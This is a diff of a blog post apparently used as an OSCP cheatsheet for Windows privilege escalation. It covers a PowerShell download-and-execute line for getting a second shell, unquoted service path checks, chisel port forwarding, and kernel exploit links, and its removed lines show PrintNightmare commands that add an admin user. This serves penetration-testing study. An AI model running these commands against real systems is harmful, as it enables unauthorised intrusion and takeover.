@@ -1,6 +1,6 @@
 ---
 title: Windows Privilege Escalation
-author: sKyW1per 
+author: sKyW1per
 category: "OSCP"
 date: "2021-03-13 00:01"
 tags: [OSCP, Cheatsheet]
@@ -10,9 +10,9 @@ layout: post
 ###### Start Process with PowerShell
 ```
 How to use powershell to pop a second connection with interactive shell
-Open a listener on 1 port and a web server with payload on another. Then run:
+Open a listener on a port and a web server with payload on another.
+Then run:
 $ Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.1.1/file.ps1')"
-
 
 Starting a shell as Administrator (when the password is known)
 
@@ -64,9 +64,14 @@ query the specific registry entry (example):
 $ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 ```
 
-
 ###### Unquoted Path
 ```
+Prerequisites:
+- Write access in the right folder
+- Ability to either restart the service or trigger a re-start by rebooting
+If you want to privesc also check:
+- Does the service run as a high(er) privileged user?
+
 finding services with autostart:
 $ wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
 $ sc query "ServiceName"
@@ -86,16 +91,6 @@ Prerequisites:
 - Path ends with .dll
 ```
 
-###### Unquoted Service Path
-```
-Prerequisites:
-- Write access in the right folder
-- Ability to either restart the service or trigger a re-start by rebooting
-If you want to privesc also check:
-- Does the service run as a high(er) privileged user?
-```
-
-
 ###### Port Forwarding
 ```
 https://github.com/jpillora/chisel
@@ -114,7 +109,6 @@ $ netstat -ntlp
 5 do stuff from kali on address 127.0.0.1 port 8888
 ```
 
-
 ###### Kernel Exploits ~ Resources
 ```
 Seclists
@@ -122,13 +116,4 @@ https://github.com/SecWiki/windows-kernel-exploits
 
 Empire
 https://github.com/EmpireProject/Empire/tree/master/data/module_source
-```
-
-###### PrintNightmare
-```
-https://github.com/calebstewart/CVE-2021-1675/
-
-Run with (in powershell):
-$ powershell -exec bypass -command "& { Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare; }"
-$ Invoke-Nightmare -NewUser "username" -NewPassword "password" -DriverName "PrintMe"
 ```
